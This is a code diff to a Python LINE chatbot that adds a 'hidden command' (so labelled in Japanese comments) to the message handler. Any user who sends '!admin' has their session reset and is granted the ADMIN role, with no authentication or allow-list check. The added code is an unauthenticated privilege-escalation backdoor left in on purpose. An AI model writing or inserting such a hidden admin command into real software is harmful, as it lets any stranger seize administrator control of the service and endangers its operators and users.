@@ -171,6 +171,24 @@ def handle_postback(event, action, data):
 def handle_message(event, text):
     line_user_id = event.source.user_id
 
+    # --- 隠しコマンド: 管理者復帰 ---
+    if text == "!admin":
+        # セッションをリセット（自分自身に戻る）
+        if line_user_id in ACTIVE_SESSIONS:
+            del ACTIVE_SESSIONS[line_user_id]
+
+        # 自分自身に管理者権限を付与
+        EconomyService.update_user_role(line_user_id, "ADMIN")
+
+        line_bot_api.reply_message(
+            event.reply_token,
+            TextSendMessage(
+                text="管理者モードに復帰しました。\n(セッションリセット & ADMIN権限付与)"
+            ),
+        )
+        return True
+    # ------------------------------
+
     # 新規ユーザー作成フロー
     state = user_states.get(line_user_id)
     if state == "WAITING_NEW_USER_NAME":
